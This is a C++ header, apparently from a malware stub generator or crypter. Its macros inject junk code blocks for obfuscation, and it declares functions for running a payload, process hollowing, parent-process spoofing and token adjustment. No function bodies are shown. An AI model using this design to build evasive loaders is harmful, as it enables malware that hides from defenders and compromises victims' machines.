#if !defined(STUB_FUNCTIONS_H)
#define STUB_FUNCTIONS_H

#pragma once

#define CODE_BLOCK_IF(condition, code) \
    _lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);\
	{\
	auto _blockIf = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, condition);\
\
	_lines.push();\
	{\
		_lines.add(code);\
	}\
	_lines.pop();\
\
	for (int i = 0; i < 2; i++)\
	{\
		_func->get_code_generator()->emulate_block(_blockIf, false);\
	}\
\
	_lines.set_trash_flags(NULL);\
	}

#define CODE_BLOCK_IF2(condition, code) \
    _lines.set_trash_flags(IS_IF);\
	{\
	auto _blockIf = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, condition);\
\
	_lines.push();\
	{\
		_lines.add(code);\
	}\
	_lines.pop();\
\
	for (int i = 0; i < 2; i++)\
	{\
		_func->get_code_generator()->emulate_block(_blockIf, false);\
	}\
\
	_lines.set_trash_flags(NULL);\
	}

#define CODE_BLOCK_IF_NO_TRASH(condition, code) \
    _lines.set_trash_flags(IS_IF | DO_NOT_CHANGE_PARENT);\
	{\
	auto _blockIf = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, condition);\
\
	_lines.push();\
	{\
		_lines.add_ex(MCODELINE_FLAG_NO_TRASH, code);\
	}\
	_lines.pop();\
\
	for (int i = 0; i < 2; i++)\
	{\
		_func->get_code_generator()->emulate_block(_blockIf, false);\
	}\
\
	_lines.set_trash_flags(NULL);\
	}

#define CODE_BLOCK_IF2_NOTRASH(condition, code) \
    _lines.set_trash_flags(IS_IF);\
	{\
	auto _blockIf = _lines.add_ex(MCODELINE_FLAG_NO_TRASH, condition);\
\
	_lines.push();\
	{\
		_lines.add_ex(MCODELINE_FLAG_NO_TRASH, code);\
	}\
	_lines.pop();\
\
	for (int i = 0; i < 2; i++)\
	{\
		_func->get_code_generator()->emulate_block(_blockIf, false);\
	}\
\
	_lines.set_trash_flags(NULL);\
	}

namespace StubFunctions
{
	namespace Build
	{
		namespace Declaration
		{
			void runPayload(mFunction* _func);
			void createHollowedProcess(mFunction* _func);
			void createProcessAndSpoofParent(mFunction* _func);
			void adjustTokenCurrentProcess(mFunction* _func);
			void getSvchostPid(mFunction* _func);
			void getProcessSid(mFunction* _func);
			void setDefaultCurrentDirectory(mFunction* _func);
		}

		namespace Body
		{
			void runPayload(mFunction* _func);
			void createHollowedProcess(mFunction* _func);
			void createProcessAndSpoofParent(mFunction* _func);
			void adjustTokenCurrentProcess(mFunction* _func);
			void getSvchostPid(mFunction* _func);
			void getProcessSid(mFunction* _func);
			void setDefaultCurrentDirectory(mFunction* _func);
		}
	}
}

#endif